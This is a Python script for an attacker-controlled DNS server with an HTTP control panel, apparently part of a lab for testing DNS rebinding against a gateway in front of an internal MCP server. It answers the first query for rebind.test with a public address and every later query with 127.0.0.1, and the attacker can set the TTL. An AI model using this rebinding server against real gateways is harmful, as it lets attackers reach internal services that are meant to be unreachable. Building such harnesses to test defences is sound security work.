"""Attacker-controlled authoritative DNS for rebind.test + HTTP control plane.

Answer policy per reset: first A query -> PUBLIC (93.184.216.34), all later
queries -> INTERNAL (127.0.0.1, the gateway container's own loopback where the
internal MCP server listens). TTL is controlled by the attacker.

Control plane (10.77.0.3:8082):
  GET /ctl?ttl=0&reset=1   -> set TTL, reset the answer counter
  GET /stats               -> counters
"""
import datetime
import json
import socket
import struct
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs, urlparse

PUBLIC = "93.184.216.34"
INTERNAL = "127.0.0.1"
ZONE = "rebind.test"
LOG = "/tmp/dns.log"

state = {"ttl": 0, "n": 0, "mode": "rebind"}
lock = threading.Lock()


def log(msg: str) -> None:
    ts = datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%fZ")
    with open(LOG, "a") as f:
        f.write(f"{ts} {msg}\n")


def parse_qname(data, off):
    labels = []
    while True:
        n = data[off]
        off += 1
        if n == 0:
            break
        if n & 0xC0:
            ptr = ((n & 0x3F) << 8) | data[off]
            off += 1
            return ".".join(labels), off, ptr
        labels.append(data[off:off + n].decode(errors="replace"))
        off += n
    return ".".join(labels), off, None


def build_response(data):
    tid = data[:2]
    qname, off, _ = parse_qname(data, 12)
    qtype, qclass = struct.unpack("!HH", data[off:off + 4])
    question = data[12:off + 4]
    with lock:
        ttl = state["ttl"]
        if qname.rstrip(".").lower() == ZONE and qtype == 1:
            state["n"] += 1
            n = state["n"]
            mode = state["mode"]
            if mode == "public":
                ip = PUBLIC
            elif mode == "private":
                ip = INTERNAL
            else:
                ip = PUBLIC if n == 1 else INTERNAL
            log(f"q#{n} A {qname} -> {ip} ttl={ttl}")
            rdata = socket.inet_aton(ip)
            answer = b"\xc0\x0c" + struct.pack("!HHIH", 1, 1, ttl, 4) + rdata
            header = tid + struct.pack("!HHHHH", 0x8180, 1, 1, 0, 0)
            return header + question + answer
        log(f"other type={qtype} name={qname}")
    header = tid + struct.pack("!HHHHH", 0x8180, 1, 0, 0, 0)
    return header + question


def dns_loop():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", 5353))
    log("START authoritative dns 0.0.0.0:5353 zone=rebind.test")
    while True:
        data, addr = s.recvfrom(4096)
        try:
            s.sendto(build_response(data), addr)
        except Exception as e:  # noqa: BLE001
            log(f"ERR {e}")


class Ctl(BaseHTTPRequestHandler):
    def do_GET(self):  # noqa: N802
        u = urlparse(self.path)
        if u.path == "/ctl":
            q = parse_qs(u.query)
            with lock:
                if "ttl" in q:
                    state["ttl"] = int(q["ttl"][0])
                if "mode" in q and q["mode"][0] in ("public", "private", "rebind"):
                    state["mode"] = q["mode"][0]
                if q.get("reset", ["0"])[0] == "1":
                    state["n"] = 0
                body = json.dumps(state).encode()
        elif u.path == "/stats":
            with lock:
                body = json.dumps(state).encode()
        else:
            self.send_response(404)
            self.end_headers()
            return
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *a):
        pass


if __name__ == "__main__":
    open(LOG, "w").close()
    threading.Thread(target=dns_loop, daemon=True).start()
    log("START control 0.0.0.0:8082")
    ThreadingHTTPServer(("0.0.0.0", 8082), Ctl).serve_forever()
